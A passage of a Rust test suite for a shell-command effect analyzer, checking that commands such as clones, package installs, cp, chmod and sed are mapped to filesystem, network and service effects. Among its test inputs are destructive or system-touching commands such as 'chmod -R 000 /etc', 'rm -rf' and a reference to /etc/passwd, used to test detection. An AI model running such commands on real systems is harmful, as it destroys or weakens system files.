            .collect::<BTreeSet<_>>();
        assert_eq!(
            domains,
            expected_domains.iter().copied().collect(),
            "{argv:?}"
        );
    }
}

#[test]
fn interpreter_subcommands_do_not_activate_script_models() {
    for (argv, reason) in [
        (&["swift", "build"][..], "unmodeled_subcommand"),
        (&["swift", "test"][..], "unmodeled_subcommand"),
        (&["swift", "run", "app"][..], "unmodeled_subcommand"),
        (&["swift", "package", "init"][..], "unmodeled_subcommand"),
        (&["swift", "repl"][..], "unmodeled_subcommand"),
        (&["swift", "sdk"][..], "unrecognized_arguments"),
        (&["scala", "test"][..], "unmodeled_subcommand"),
        (&["scala", "compile"][..], "unmodeled_subcommand"),
        (&["scala", "repl"][..], "unmodeled_subcommand"),
        (&["scala", "clean"][..], "unmodeled_subcommand"),
        (&["scala", "version"][..], "unmodeled_subcommand"),
        (&["scala", "package"][..], "unmodeled_subcommand"),
        (&["scala", "doc"][..], "unmodeled_subcommand"),
        (&["scala", "fmt"][..], "unmodeled_subcommand"),
        (&["scala", "run", "Main.scala"][..], "unmodeled_subcommand"),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{argv:?}"
        );
        assert!(has_boundary(&plan, reason), "{argv:?}");
    }

    for (argv, expected) in [
        (&["scala", "/work/program.scala"][..], "/work/program.scala"),
        (
            &["swift", "scripts/tool.swift"][..],
            "/work/scripts/tool.swift",
        ),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_effect(&plan, "filesystem.read", expected), "{argv:?}");
    }
}

#[test]
fn replacing_compressors_disclose_input_deletion() {
    for argv in [
        &["xz", "/work/input"][..],
        &["bzip2", "/work/input"][..],
        &["pigz", "/work/input"][..],
        &["unxz", "/work/input.xz"][..],
        &["bunzip2", "/work/input.bz2"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_effect(&plan, "filesystem.delete", argv[1]), "{argv:?}");
    }

    let zstd = analyze(&["zstd", "/work/input"], Some("/work"));
    assert!(!has_effect(&zstd, "filesystem.delete", "/work/input"));
}

#[test]
fn scp_style_relative_urls_keep_host_and_clone_basename() {
    let git = analyze(
        &["git", "clone", "git@github.com:org/repo.git"],
        Some("/work"),
    );
    assert!(has_network_host(&git, "network.download", "github.com"));

    let hg = analyze(
        &["hg", "clone", "user@hg.example.net:team/repo"],
        Some("/work"),
    );
    assert!(has_network_host(&hg, "network.download", "hg.example.net"));
    assert!(has_effect(&hg, "filesystem.write", "/work/repo"));
}

#[test]
fn surplus_operands_are_explicit_on_bounded_surfaces() {
    for argv in [
        &[
            "aria2c",
            "https://a.example.com/one",
            "https://b.example.com/two",
        ][..],
        &["ansible-playbook", "one.yml", "two.yml"][..],
        &["sftp", "u@one.example:/a", "u@two.example:/b"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }
}

#[test]
fn platform_specific_declarations_pin_target_predicates() {
    for (source, expected_os) in [
        (
            include_str!("../../models/v1/tranche/transfer-archive-process/sw_vers.json"),
            "macos",
        ),
        (
            include_str!("../../models/v1/tranche/transfer-archive-process/launchctl.json"),
            "macos",
        ),
        (
            include_str!("../../models/v1/tranche/transfer-archive-process/psrinfo.json"),
            "solaris",
        ),
        (
            include_str!("../../models/v1/tranche/transfer-archive-process/pmcycles.json"),
            "aix",
        ),
        (
            include_str!("../../models/v1/tranche/transfer-archive-process/cygpath.json"),
            "windows",
        ),
    ] {
        let document: DeclarationDocument = serde_json::from_str(source).unwrap();
        assert!(matches!(
            document.applicability.platforms.as_slice(),
            [PlatformPredicate::Target { os, arch: None }] if os == expected_os
        ));
    }
}

#[test]
fn effect_free_declarations_use_boundary_evidence() {
    for source in [
        include_str!("../../models/v1/tranche/transfer-archive-process/col.json"),
        include_str!("../../models/v1/tranche/transfer-archive-process/cygpath.json"),
        include_str!("../../models/v1/tranche/transfer-archive-process/pmcycles.json"),
        include_str!("../../models/v1/tranche/transfer-archive-process/print.json"),
        include_str!("../../models/v1/tranche/transfer-archive-process/ps.json"),
        include_str!("../../models/v1/tranche/transfer-archive-process/psrinfo.json"),
        include_str!("../../models/v1/tranche/transfer-archive-process/sw_vers.json"),
        include_str!("../../models/v1/tranche/transfer-archive-process/sysctl.json"),
    ] {
        let document: DeclarationDocument = serde_json::from_str(source).unwrap();
        assert!(document.evidence.expected_facts.is_empty());
        assert!(!document.evidence.expected_boundaries.is_empty());
    }
}

#[test]
fn dotnet_default_restore_and_bazel_output_are_modeled() {
    let dotnet = analyze(&["dotnet", "restore"], Some("/work"));
    assert!(has_effect(&dotnet, "network.download", "?network"));
    assert!(has_effect(&dotnet, "filesystem.write", "pat:/work/obj"));
    assert!(!has_boundary(&dotnet, "missing_required_arguments"));

    let bazel = analyze(&["bazel", "build", "//app:bin"], Some("/work"));
    assert!(has_effect(
        &bazel,
        "filesystem.write",
        "pat:/work/bazel-out/*"
    ));
    assert!(!has_effect(&bazel, "filesystem.write", "pat:/app:bin"));
}

#[test]
fn minikube_delete_without_profile_discloses_cluster_removal() {
    let plan = analyze(&["minikube", "delete"], Some("/work"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "container.remove")
    );
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

#[test]
fn kind_delete_consumes_the_cluster_noun() {
    let plan = analyze(
        &["kind", "delete", "cluster", "--name", "kc"],
        Some("/work"),
    );
    assert!(has_effect(&plan, "container.remove", "container:kc"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

#[test]
fn unreviewed_promoted_flags_remain_explicit_boundaries() {
    for argv in [
        &["date", "--reference", "/etc/passwd"][..],
        &["start-stop-daemon", "--chuid", "daemon"][..],
        &["start-stop-daemon", "--chdir", "/tmp"][..],
        &["start-stop-daemon", "--background"][..],
        &["start-stop-daemon", "--make-pidfile"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }
}

#[test]
fn layered_unsupported_arguments_emit_one_boundary() {
    for argv in [
        &["minikube", "delete", "--all"][..],
        &["cockroach", "sql", "--no-such-option"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert_eq!(
            plan.boundaries
                .iter()
                .filter(|boundary| boundary.reason.as_str() == "unrecognized_arguments")
                .count(),
            1,
            "{argv:?}"
        );
    }
}

#[test]
fn unsupported_symbolic_operands_keep_informative_details() {
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "ps \"$PID\"".into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    let detail = plan
        .boundaries
        .iter()
        .find(|boundary| boundary.reason.as_str() == "unrecognized_arguments")
        .and_then(|boundary| boundary.detail.as_deref())
        .expect("unsupported operand detail");
    assert!(
        detail
            .rsplit_once(": ")
            .is_some_and(|(_, rendered)| !rendered.is_empty())
    );
}

#[test]
fn promoted_vcs_clones_derive_the_endpoint_from_the_source() {
    for (argv, endpoint) in [
        (
            &["svn", "checkout", "https://svn.example.net/repo", "work"][..],
            "net:https://svn.example.net/repo",
        ),
        (
            &["hg", "clone", "http://hg.example.net:8080/a/b", "repo"][..],
            "net:http://hg.example.net:8080/a/b",
        ),
        (
            &[
                "fossil",
                "clone",
                "https://fossil.example.net/proj",
                "repo.fossil",
            ][..],
            "net:https://fossil.example.net/proj",
        ),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_effect(&plan, "network.download", endpoint), "{argv:?}");
    }
}

#[test]
fn promoted_install_defaults_are_modeled_without_missing_arguments() {
    for (argv, write) in [
        (
            &["svn", "checkout", "https://svn.example.net/repo"][..],
            "/work/repo",
        ),
        (
            &["hg", "clone", "https://hg.example.net/team/repo"][..],
            "/work/repo",
        ),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_effect(&plan, "filesystem.write", write), "{argv:?}");
        assert!(!has_boundary(&plan, "missing_required_arguments"));
    }

    let bun = analyze(&["bun", "install"], Some("/work"));
    assert!(
        bun.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    assert!(
        bun.effects
            .iter()
            .any(|effect| effect.operation.0 == "network.download")
    );
    assert!(!has_boundary(&bun, "missing_required_arguments"));
    assert!(bun.provenance.iter().any(|node| matches!(&node.kind,
        effinterp_proto::ProvenanceKind::ModelApplication { model } if model == "pkg/manager@v1")));
}

#[test]
fn explicit_clone_destinations_do_not_also_write_url_basenames() {
    for argv in [
        &["svn", "checkout", "https://svn.example.net/repo", "work"][..],
        &["hg", "clone", "https://hg.example.net/team/repo", "work"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        let writes = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.write")
            .collect::<Vec<_>>();
        assert_eq!(writes.len(), 1, "{argv:?}");
        assert!(has_effect(&plan, "filesystem.write", "/work/work"));
    }
}

#[test]
fn reviewed_flag_forms_never_become_silent() {
    for argv in [
        &["cpio", "-i"][..],
        &["gtar", "-x"][..],
        &["ps", "-A"][..],
        &["sysctl", "-a"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }
}

#[test]
fn optional_promoted_operands_model_default_behavior() {
    let pipenv = analyze(&["pipenv", "install"], Some("/work"));
    assert!(
        pipenv
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "network.download")
    );
    assert!(
        pipenv
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    assert!(!has_boundary(&pipenv, "missing_required_arguments"));

    let ninja = analyze(&["ninja"], Some("/work"));
    assert!(
        ninja
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );
    assert!(
        ninja
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    assert!(!has_boundary(&ninja, "missing_required_arguments"));

    let ninja_target = analyze(&["ninja", "app"], Some("/work"));
    assert!(has_effect(
        &ninja_target,
        "filesystem.read",
        "/work/build.ninja"
    ));
    assert!(has_effect(&ninja_target, "filesystem.write", "?filesystem"));
    assert!(!has_boundary(&ninja_target, "unrecognized_arguments"));

    let ninja_directory_target = analyze(&["ninja", "-C", "build", "install"], Some("/work"));
    assert!(has_effect(
        &ninja_directory_target,
        "filesystem.read",
        "/work/build/build.ninja"
    ));
    assert!(has_effect(
        &ninja_directory_target,
        "filesystem.write",
        "?filesystem"
    ));
    assert!(!has_effect(
        &ninja_directory_target,
        "filesystem.write",
        "/work/build/install"
    ));

    let fossil = analyze(
        &["fossil", "clone", "https://fossil.example.net/proj"],
        Some("/work"),
    );
    assert!(has_effect(&fossil, "filesystem.write", "/work/proj"));
    assert!(!has_boundary(&fossil, "missing_required_arguments"));

    let createdb = analyze(&["createdb"], Some("/work"));
    assert!(has_effect(&createdb, "database.schema_write", "?database"));
    assert!(!has_boundary(&createdb, "missing_required_arguments"));

    for command in ["ftp", "lftp"] {
        let plan = analyze(&[command], Some("/work"));
        assert!(has_boundary(&plan, "interactive_input"), "{command}");
        assert!(
            !has_boundary(&plan, "missing_required_arguments"),
            "{command}"
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "network.connect"),
            "{command}"
        );
    }

    let msbuild = analyze(&["msbuild"], Some("/work"));
    assert!(has_effect(&msbuild, "filesystem.read", "?filesystem"));
    assert!(has_effect(&msbuild, "filesystem.write", "?filesystem"));
    assert!(!has_boundary(&msbuild, "missing_required_arguments"));
}

#[test]
fn unknown_flags_do_not_shift_promoted_effect_operands() {
    let plan = analyze(
        &["jq", "--unknown-input", "data", "/work/input.json"],
        Some("/work"),
    );
    assert!(has_boundary(&plan, "unrecognized_arguments"));
    assert!(
        plan.effects
            .iter()
            .all(|effect| effect.operation.0 != "filesystem.read")
    );
}

#[test]
fn promoted_models_activate_only_on_reviewed_surfaces() {
    for (argv, absent) in [
        (&["svn", "status"][..], "network.download"),
        (&["hg", "log"][..], "network.download"),
        (&["helm", "list"][..], "container.remove"),
        (
            &["doctl", "kubernetes", "cluster", "delete", "my-cluster"][..],
            "cloud.resource.delete",
        ),
        (
            &["nomad", "alloc", "stop", "abc123"][..],
            "cloud.resource.delete",
        ),
        (&["uv", "tool", "unknown", "ruff"][..], "network.download"),
        (
            &["ibmcloud", "service-instance-delete", "old-db"][..],
            "cloud.resource.delete",
        ),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != absent),
            "{argv:?} emitted {absent}"
        );
    }
}

#[test]
fn mosquitto_request_and_response_topics_are_distinct() {
    let plan = analyze(
        &[
            "mosquitto_rr",
            "--topic",
            "request/topic",
            "--response-topic",
            "response/topic",
        ],
        Some("/work"),
    );
    assert!(has_effect(
        &plan,
        "messaging.publish",
        "topic:request/topic"
    ));
    assert!(has_effect(
        &plan,
        "messaging.consume",
        "topic:response/topic"
    ));
    assert!(!has_effect(
        &plan,
        "messaging.consume",
        "topic:request/topic"
    ));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

#[test]
fn promoted_wrappers_preserve_targets_and_nested_argv() {
    let plan = analyze(&["strace", "rm", "/tmp/x"], Some("/work"));
    assert!(has_effect(&plan, "filesystem.delete", "/tmp/x"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));

    let plan = analyze(
        &[
            "strace",
            "curl",
            "-o",
            "/tmp/out",
            "https://example.com/file",
        ],
        Some("/work"),
    );
    assert!(has_effect(
        &plan,
        "network.download",
        "net:https://example.com/file"
    ));
    assert!(has_effect(&plan, "filesystem.write", "/tmp/out"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));

    let plan = analyze(&["strace", "-f", "rm", "-rf", "/tmp/x"], Some("/work"));
    assert!(has_effect(&plan, "filesystem.delete", "/tmp/x"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));

    let plan = analyze(&["service", "nginx", "restart"], Some("/work"));
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "system.service_restart"
                && effinterp_proto::display_resource(&e.resource) == "svc:nginx")
    );

    let plan = analyze(
        &["launchctl", "load", "/Library/LaunchDaemons/x.plist"],
        Some("/work"),
    );
    assert!(has_effect(
        &plan,
        "filesystem.read",
        "/Library/LaunchDaemons/x.plist"
    ));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "system.service_enable")
    );
}

#[test]
fn inline_interpreters_do_not_require_a_script_operand() {
    for argv in [
        &["csh", "-c", "print(1)"][..],
        &["tcsh", "-c", "print(1)"][..],
        &["fish", "-c", "print(1)"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            !has_boundary(&plan, "missing_required_arguments"),
            "{argv:?}"
        );
        assert_eq!(
            attr(&plan, "process.code_execution", "source"),
            Some(AttrValue::String("argument".into())),
            "{argv:?}"
        );
        assert!(has_boundary(&plan, "dynamic_source"), "{argv:?}");
    }

    // ksh runs the shell language the engine analyzes, so its inline code is
    // walked instead of bounded as an unrecoverable source.
    let ksh = analyze(&["ksh", "-c", "print(1)"][..], Some("/work"));
    assert_eq!(
        attr(&ksh, "process.code_execution", "source"),
        Some(AttrValue::String("argument".into()))
    );
    assert!(!has_boundary(&ksh, "dynamic_source"));
    assert!(ksh.execution_graph.nodes.iter().any(
        |node| matches!(&node.subject, Subject::Shell { source, .. } if source == "print(1)")
    ));

    for argv in [
        &["powershell", "-c", "Write-Output 1"][..],
        &["pwsh", "-c", "Write-Output 1"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert_eq!(
            attr(&plan, "process.code_execution", "source"),
            Some(AttrValue::String("argument".into())),
            "{argv:?}"
        );
    }
}

#[test]
fn promoted_package_installs_disclose_scripts() {
    for argv in [
        &["gem", "install", "rails"][..],
        &["uv", "pip", "install", "requests"][..],
        &["composer", "require", "vendor/package"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "network.download"),
            "{argv:?}"
        );
        assert!(has_boundary(&plan, "package_scripts"), "{argv:?}");
    }
}

#[test]
fn promoted_launchers_handoff_inner_argv() {
    for argv in [
        &["uv", "run", "rm", "/uv-inner"][..],
        &["uvx", "rm", "/uvx-inner"][..],
        &["poetry", "run", "rm", "/poetry-inner"][..],
        &["pipx", "run", "rm", "/pipx-inner"][..],
        &["pipx", "run", "--spec", "tool==1", "rm", "/pipx-spec-inner"][..],
        &["npx", "rm", "/npx-inner"][..],
        &["uvx", "--from", "tool", "rm", "/uvx-from-inner"][..],
        &["npx", "-c", "rm /npx-call-inner"][..],
        &["npx", "--package=tool", "-c", "rm /npx-call-inner"][..],
        // npx's options end at the command, so the child keeps its own `-c`.
        &["npx", "--package=tool", "sh", "-c", "rm /npx-child-inner"][..],
        &["bunx", "sh", "-c", "rm /bunx-child-inner"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"),
            "{argv:?}"
        );
    }
    // npm refuses operands beside a call body, so nothing runs; bunx has no
    // call mode, so its `-c` stays an unrecognized option.
    for argv in [
        &["npx", "-c", "rm /npx-call-inner", "extra"][..],
        &["bunx", "--package=tool", "-c", "rm /bunx-call-inner"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"),
            "{argv:?}"
        );
    }

    for argv in [
        &["uv", "run", "script.py"][..],
        &["uvx", "script.py"][..],
        &["poetry", "run", "script.py"][..],
        &["pipx", "run", "script.py"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            plan.execution_graph.nodes.iter().any(|node| {
                matches!(
                    &node.subject,
                    Subject::Exec { argv, .. }
                        if argv == &["python3".to_string(), "script.py".to_string()]
                )
            }),
            "{argv:?}"
        );
    }
}

#[test]
fn java_archive_commands_stay_unmodeled() {
    {
        let argv = &["java", "-jar", "dist/app.jar"][..];
        let plan = analyze(argv, Some("/repo"));
        assert!(has_boundary(&plan, "unmodeled_command"), "{argv:?}");
        assert!(!has_boundary(&plan, "unrecoverable_source"), "{argv:?}");
        assert_eq!(
            plan.coverage.0[&Domain::new("filesystem")].level,
            CoverageLevel::None,
            "{argv:?}"
        );
    }
}

// ---- fsutils ----

#[test]
fn cp_reads_sources_writes_dest() {
    let plan = analyze(&["cp", "-r", "src", "/dest"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/src"));
    assert!(has_effect(&plan, "filesystem.write", "/dest"));
    assert_eq!(
        attr(&plan, "filesystem.read", "recursive"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn cp_target_directory_flag() {
    let plan = analyze(&["cp", "-t", "/dest", "a", "b"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a"));
    assert!(has_effect(&plan, "filesystem.write", "/dest/a"));
    assert!(has_effect(&plan, "filesystem.write", "/dest/b"));
}

#[test]
fn touch_respects_no_create() {
    let plan = analyze(&["touch", "-c", "f"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.metadata", "/w/f"));
    assert_eq!(attr(&plan, "filesystem.metadata", "create"), None);
    let plan = analyze(&["touch", "f"], Some("/w"));
    assert_eq!(
        attr(&plan, "filesystem.metadata", "create"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn filesystem_node_creation_forms() {
    let plan = analyze(&["ln", "-s", "/target", "link"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.create", "/w/link"));
    assert_eq!(
        attr(&plan, "filesystem.create", "symlink"),
        Some(AttrValue::Bool(true))
    );

    let plan = analyze(&["ln", "-s", "/data/config"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.create", "/w/config"));

    let plan = analyze(&["ln", "-s", "/t1", "/t2", "dir"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.create", "/w/dir/t1"));
    assert!(has_effect(&plan, "filesystem.create", "/w/dir/t2"));
    for (args, paths) in [
        (vec!["pipe"], vec!["/w/pipe"]),
        (vec!["-m", "600", "one", "two"], vec!["/w/one", "/w/two"]),
        (vec!["--mode=600", "pipe"], vec!["/w/pipe"]),
        (vec!["-m600", "pipe"], vec!["/w/pipe"]),
        (vec!["--mode", "u=rw", "pipe"], vec!["/w/pipe"]),
        (vec!["-Z", "pipe"], vec!["/w/pipe"]),
        (vec!["-Zm600", "pipe"], vec!["/w/pipe"]),
        (
            vec!["--context", "pipe", "other"],
            vec!["/w/pipe", "/w/other"],
        ),
        (
            vec!["--context=system_u:object_r:tmp_t:s0", "pipe"],
            vec!["/w/pipe"],
        ),
        (vec!["--con=label", "--mo=600", "pipe"], vec!["/w/pipe"]),
        (vec!["--", "--help", "-m"], vec!["/w/--help", "/w/-m"]),
        (vec!["pipe", "--help"], vec![]),
        (vec!["--version", "pipe"], vec![]),
        (vec![], vec![]),
    ] {
        let mut argv = vec!["mkfifo"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        let creates: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "filesystem.create")
            .collect();
        assert_eq!(
            creates
                .iter()
                .map(|e| display_resource(&e.resource))
                .collect::<Vec<_>>(),
            paths
                .iter()
                .map(|path| format!("fs:{path}"))
                .collect::<Vec<_>>(),
            "{argv:?}"
        );
        for effect in creates {
            assert_eq!(effect.attributes.get("fifo"), Some(&AttrValue::Bool(true)));
            assert_eq!(
                effect.request_assurance,
                effinterp_proto::RequestAssurance::Exact
            );
            assert_eq!(effect.modality, effinterp_proto::Modality::May);
        }
        assert!(!plan.effects.iter().any(|e| matches!(
            e.operation.0.as_str(),
            "filesystem.read" | "filesystem.write"
        )));
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
        assert_eq!(
            plan.coverage.level(&Domain::new("filesystem")),
            Some(CoverageLevel::Full)
        );
    }
    for args in [
        vec!["pipe", "-m"],
        vec!["--unknown", "pipe"],
        vec!["--help=value", "pipe"],
    ] {
        let mut argv = vec!["mkfifo"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/w"));
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "filesystem.create")
        );
    }
}

#[test]
fn rmdir_is_directory_delete() {
    let plan = analyze(&["rmdir", "empty"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.delete", "/w/empty"));
    assert_eq!(
        attr(&plan, "filesystem.delete", "directory"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn chmod_recursive_system_tree() {
    let plan = analyze(&["chmod", "-R", "000", "/etc"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.metadata", "/etc"));
    assert_eq!(
        attr(&plan, "filesystem.metadata", "recursive"),
        Some(AttrValue::Bool(true))
    );
    assert_eq!(
        attr(&plan, "filesystem.metadata", "spec"),
        Some(AttrValue::String("000".into()))
    );
    assert_eq!(
        attr(&plan, "filesystem.metadata", "action"),
        Some(AttrValue::String("chmod".into()))
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.metadata"
            && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
    }));
}

#[test]
fn chmod_dash_mode_is_not_a_flag() {
    let plan = analyze(&["chmod", "-w", "f"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.metadata", "/w/f"));
    assert_eq!(
        attr(&plan, "filesystem.metadata", "spec"),
        Some(AttrValue::String("-w".into()))
    );
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

#[test]
fn chmod_proven_permission_grants_are_typed() {
    for (mode, grants) in [
        ("0777", &["world_write"][..]),
        ("4755", &["setuid"][..]),
        ("g+s", &["setgid"][..]),
        ("o+w", &["world_write"][..]),
        ("a+w", &["world_write"][..]),
        ("u+s", &["setuid"][..]),
        ("a+s", &["setuid", "setgid"][..]),
        ("6755", &["setuid", "setgid"][..]),
        ("4777", &["world_write", "setuid"][..]),
        // Regression: grants were matched by spelling, so these equivalent
        // modes emitted the chmod without the grant fs-permission-weaken reads.
        ("a+rwx", &["world_write"][..]),
        ("ugo=rwx", &["world_write"][..]),
        ("go+wx", &["world_write"][..]),
        ("u+x,o+w", &["world_write"][..]),
        ("+s", &["setuid", "setgid"][..]),
        ("ug+xs", &["setuid", "setgid"][..]),
        ("+2002", &["world_write", "setgid"][..]),
        // Regression: a later clause without a who letter that names no write
        // permission erased the proven other-write before the umask rule.
        ("o+w,-x", &["world_write"][..]),
        ("o+w,-r", &["world_write"][..]),
        ("u+s,+x", &["setuid"][..]),
    ] {
        let plan = analyze(&["chmod", mode, "safe"], Some("/w"));
        for grant in grants {
            assert!(
                plan.effects.iter().any(|effect| {
                    effect.operation.0 == "filesystem.metadata"
                        && display_resource(&effect.resource) == "fs:/w/safe"
                        && effect.attributes.get("action")
                            == Some(&AttrValue::String("chmod".into()))
                        && effect.attributes.get(*grant) == Some(&AttrValue::Bool(true))
                }),
                "{mode} did not produce {grant}"
            );
        }
    }
}

#[test]
fn chmod_grants_do_not_leak_to_chown_or_reference_modes() {
    for argv in [
        &["chown", "4777", "safe"][..],
        &["chgrp", "4755", "safe"][..],
        &["chmod", "--reference=reference", "safe"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(!plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.metadata"
                && ["world_write", "setuid", "setgid"]
                    .iter()
                    .any(|grant| effect.attributes.get(*grant) == Some(&AttrValue::Bool(true)))
        }));
    }
}

#[test]
fn chmod_umask_dependent_and_unknown_modes_remain_untyped() {
    // A later clause can take the grant back, `=` sets exactly what it
    // names, and a copied class or the umask leaves the bit unknown.
    for mode in [
        "+w",
        "u+rw",
        "symbolic",
        "0644",
        "600",
        "=rwx",
        "o+w,o-w",
        "o+w,-w",
        "a+rwx,go-w",
        "o+w,o=rx",
        "o=u",
        "u=rwx,g=rx",
        "a+wu",
        "o+w,",
    ] {
        let plan = analyze(&["chmod", mode, "safe"], Some("/w"));
        assert!(!plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.metadata"
                && ["world_write", "setuid", "setgid"]
                    .iter()
                    .any(|grant| effect.attributes.get(*grant) == Some(&AttrValue::Bool(true)))
        }));
    }
}

#[test]
fn chmod_exact_requests_require_a_valid_mode_or_reference_shape() {
    for argv in [
        &["chmod", "u=rw,go=r", "/home/alice"][..],
        &["chmod", "+110", "/home/alice"][..],
        &["chmod", "--reference=reference", "/home/alice"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.metadata"
                    && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
                    && effect.attributes.get("action") == Some(&AttrValue::String("chmod".into()))
            }),
            "{argv:?}: {:#?}",
            plan.effects
        );
    }

    for argv in [
        &["chmod", "888", "/etc"][..],
        &["chmod", "u+q", "/etc"][..],
        &["chmod", "u+r,,g+w", "/etc"][..],
        &["chmod", "--unknown", "755", "/etc"][..],
        &["chmod", "-R=garbage", "755", "/etc"][..],
        &["chmod", "--recursive=garbage", "755", "/etc"][..],
        &["chmod", "--reference=", "/etc"][..],
        &["chmod", "755"][..],
        &["chmod", "-w", "-x", "/etc"][..],
        &["chmod", "--reference=reference", "-w", "/etc"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.metadata"
                    && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            }),
            "{argv:?}: {:#?}",
            plan.effects
        );
        assert!(
            has_boundary(&plan, "unrecognized_arguments")
                || has_boundary(&plan, "missing_required_arguments"),
            "{argv:?}: {:#?}",
            plan.boundaries
        );
    }
}

#[test]
fn truncate_consumes_size_value() {
    let plan = analyze(&["truncate", "-s", "0", "f"], Some("/w"));
    assert_eq!(
        ops(&plan)
            .iter()
            .filter(|(o, _)| *o == "filesystem.write")
            .count(),
        1
    );
    assert!(has_effect(&plan, "filesystem.write", "/w/f"));
}

#[test]
fn tee_append() {
    let plan = analyze(&["tee", "-a", "log"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/w/log"));
    assert_eq!(
        attr(&plan, "filesystem.write", "append"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn head_count_flag_consumes_value() {
    let plan = analyze(&["head", "-n", "5", "f"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/f"));
    assert!(!has_effect(&plan, "filesystem.read", "/w/5"));
}

#[test]
fn sed_in_place_writes_operand() {
    for argv in [
        vec!["sed", "-i", "s/a/b/", "f"],
        vec!["sed", "-i.bak", "s/a/b/", "f"],
        vec!["sed", "--in-place=.bak", "s/a/b/", "f"],
        vec!["sed", "-i", "-e", "s/a/b/", "f"],
        vec!["sed", "-i", "", "/undefined,$/d", "f"],
        vec!["sed", "-E", "-n", "-i", "", "s/a/b/", "f"],
        vec!["sed", "-i", "", "-e", "s/a/b/", "f"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            ops(&plan)
                .into_iter()
                .filter(|(operation, _)| operation.starts_with("filesystem."))
                .collect::<Vec<_>>(),
            vec![
                ("filesystem.read", "/w/f".to_string()),
                ("filesystem.write", "/w/f".to_string()),
            ],
            "{argv:?}"
        );
        assert_eq!(
            attr(&plan, "filesystem.write", "in_place"),
            Some(AttrValue::Bool(true))
        );
        assert_eq!(
            plan.coverage
                .0
                .get(&Domain::new("filesystem"))
                .map(|claim| &claim.level),
            Some(&CoverageLevel::Full)
        );
    }

